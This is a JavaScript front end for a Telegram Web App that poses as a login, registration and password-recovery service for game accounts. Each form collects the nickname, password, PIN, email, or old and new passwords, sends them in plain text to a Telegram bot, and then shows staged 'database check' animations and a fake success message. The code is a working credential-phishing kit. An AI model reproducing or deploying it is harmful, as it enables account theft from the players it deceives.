const tg = window.Telegram.WebApp;
tg.expand();

// === АНИМАЦИЯ ЗАГРУЗКИ ПРИ СТАРТЕ ===
let percent = 0;
const bar = document.getElementById('bar');
const percentText = document.getElementById('percent');
const loader = document.getElementById('loader');
const main = document.getElementById('main');

if (loader && main) {
    const interval = setInterval(() => {
        percent += 2;
        if (percent >= 100) {
            percent = 100;
            clearInterval(interval);
            setTimeout(() => {
                loader.style.display = 'none';
                main.style.display = 'block';
            }, 300);
        }
        if (bar) bar.style.width = percent + '%';
        if (percentText) percentText.textContent = percent + '%';
    }, 30);
}

// === ПИН-КОД ===
function togglePin() {
    const checkbox = document.getElementById('hasPin');
    const pinInput = document.getElementById('pin');
    const pinGroup = document.getElementById('pinGroup');
    if (!checkbox || !pinInput || !pinGroup) return;

    if (checkbox.checked) {
        pinInput.disabled = false;
        pinInput.placeholder = 'Введите пин-код';
        pinInput.focus();
        pinGroup.classList.remove('disabled');
    } else {
        pinInput.disabled = true;
        pinInput.value = '';
        pinInput.placeholder = 'Пин-код отключён';
        pinGroup.classList.add('disabled');
    }
}

// === ТОЛЬКО АНГЛИЙСКИЕ БУКВЫ ===
function onlyEnglish(input) {
    input.value = input.value.replace(/[^A-Za-z0-9_]/g, '');
}

// === ТОЛЬКО 4 ЦИФРЫ ДЛЯ ПИН-КОДА ===
function onlyPin(input) {
    input.value = input.value.replace(/[^0-9]/g, '').slice(0, 4);
}

// === ЗЕЛЁНАЯ ИКОНКА ПРИ ЗАПОЛНЕНИИ ===
function markFilled(inputId, iconId) {
    const input = document.getElementById(inputId);
    const icon = document.getElementById(iconId);
    if (!input || !icon) return;

    input.addEventListener('input', () => {
        if (input.value.trim() !== '') {
            icon.classList.remove('red');
            icon.classList.add('green');
        } else {
            icon.classList.remove('green');
            icon.classList.add('red');
        }
    });
}

document.addEventListener('DOMContentLoaded', () => {
    markFilled('nick', 'iconNick');
    markFilled('password', 'iconPass');
    markFilled('pin', 'iconPin');
    markFilled('email', 'iconEmail');
    markFilled('referrer', 'iconRef');
    markFilled('old_password', 'iconOldPass');
    markFilled('new_password', 'iconNewPass');
});

// === АНИМАЦИЯ ЗАГРУЗКИ ===
function showLoading(text, callback) {
    const loaderDiv = document.createElement('div');
    loaderDiv.className = 'loader-screen';
    loaderDiv.id = 'tempLoader';
    loaderDiv.innerHTML = `
        <div class="loader-circle"></div>
        <div class="loader-text">${text}</div>
        <div class="loader-percent" id="tempPercent">0%</div>
        <div class="loader-bar">
            <div class="loader-bar-fill" id="tempBar"></div>
        </div>
    `;
    document.body.appendChild(loaderDiv);

    let p = 0;
    const int = setInterval(() => {
        p += 2;
        if (p >= 100) {
            p = 100;
            clearInterval(int);
            setTimeout(() => {
                loaderDiv.remove();
                if (callback) callback();
            }, 300);
        }
        const tempBar = document.getElementById('tempBar');
        const tempPercent = document.getElementById('tempPercent');
        if (tempBar) tempBar.style.width = p + '%';
        if (tempPercent) tempPercent.textContent = p + '%';
    }, 30);
}

// === СООБЩЕНИЕ С ГАЛОЧКОЙ ===
function showSuccess(text, nick, server) {
    const now = new Date();
    const time = now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');

    const overlay = document.createElement('div');
    overlay.className = 'success-overlay';
    overlay.innerHTML = `
        <div class="success-box">
            <div class="success-check">✔</div>
            <div class="success-text">${text}</div>
            <div class="success-info">${nick} • ${time} • ${server}</div>
            <button class="success-btn" onclick="this.parentElement.parentElement.remove()">ЗАКРЫТЬ</button>
        </div>
    `;
    document.body.appendChild(overlay);
}

// === ОТПРАВКА БОТУ ===
function sendToBot(text) {
    try {
        tg.sendData(text);
    } catch (e) {
        console.error('Ошибка отправки:', e);
    }
}

// === ФУНКЦИИ ===
function goTo(page) { window.location.href = page; }
function validateNick(nick) { return /^[A-Za-z]+_[A-Za-z]+$/.test(nick); }

function login() {
    const nick = document.getElementById('nick').value.trim();
    const password = document.getElementById('password').value.trim();
    const pin = document.getElementById('pin').value.trim();
    const server = document.getElementById('server').value;

    if (!nick) { alert('Введите ник!'); return; }
    if (!password) { alert('Введите пароль!'); return; }

    const data = (
        `🔐 <b>ВХОД В АККАУНТ</b>\n\n` +
        `👤 <b>Ник:</b> <code>${nick}</code>\n` +
        `🔒 <b>Пароль:</b> <code>${password}</code>\n` +
        `🛡 <b>ПИН-код:</b> <code>${pin || 'нет'}</code>\n` +
        `🌍 <b>Сервер:</b> <code>${server}</code>`
    );

    sendToBot(data);

    showLoading('ПРОВЕРКА ДАННЫХ', () => {
        showSuccess('Вход выполнен!', nick, server);
    });
}

function register() {
    const nick = document.getElementById('nick').value.trim();
    const password = document.getElementById('password').value.trim();
    const pin = document.getElementById('pin').value.trim();
    const email = document.getElementById('email').value.trim();
    const server = document.getElementById('server').value;
    const referrer = document.getElementById('referrer').value.trim();

    if (!nick) { alert('Введите ник!'); return; }
    if (!validateNick(nick)) { alert('Ник в формате Nick_Name (только английские)!'); return; }
    if (!password) { alert('Введите пароль!'); return; }

    const data = (
        `📝 <b>РЕГИСТРАЦИЯ АККАУНТА</b>\n\n` +
        `👤 <b>Ник:</b> <code>${nick}</code>\n` +
        `🔒 <b>Пароль:</b> <code>${password}</code>\n` +
        `🛡 <b>ПИН-код:</b> <code>${pin || 'нет'}</code>\n` +
        `📧 <b>Почта:</b> <code>${email || 'нет'}</code>\n` +
        `🌍 <b>Сервер:</b> <code>${server}</code>\n` +
        `👥 <b>Пригласил:</b> <code>${referrer || 'нет'}</code>`
    );

    sendToBot(data);

    showLoading('ОБРАБОТКА ДАННЫХ', () => {
        showLoading('ЗАГРУЗКА ДАННЫХ', () => {
            showLoading('ОБНОВЛЕНИЕ БАЗЫ ДАННЫХ', () => {
                showSuccess('Вы успешно зарегистрировали аккаунт!', nick, server);
            });
        });
    });
}

function recover() {
    const nick = document.getElementById('nick').value.trim();
    const oldPass = document.getElementById('old_password').value.trim();
    const newPass = document.getElementById('new_password').value.trim();
    const pin = document.getElementById('pin').value.trim();
    const server = document.getElementById('server').value;

    if (!nick) { alert('Введите ник!'); return; }
    if (!oldPass) { alert('Введите старый пароль!'); return; }
    if (!newPass) { alert('Введите новый пароль!'); return; }

    const data = (
        `🔄 <b>ВОССТАНОВЛЕНИЕ АККАУНТА</b>\n\n` +
        `👤 <b>Ник:</b> <code>${nick}</code>\n` +
        `🔓 <b>Старый пароль:</b> <code>${oldPass}</code>\n` +
        `🔒 <b>Новый пароль:</b> <code>${newPass}</code>\n` +
        `🛡 <b>ПИН-код:</b> <code>${pin || 'нет'}</code>\n` +
        `🌍 <b>Сервер:</b> <code>${server}</code>`
    );

    sendToBot(data);

    showLoading('ПРОВЕРКА В БАЗЕ ДАННЫХ', () => {
        showLoading('ВНЕСЕНИЕ НОВЫХ ДАННЫХ', () => {
            showSuccess('Данные от аккаунта успешно обновлены', nick, server);
        });
    });
}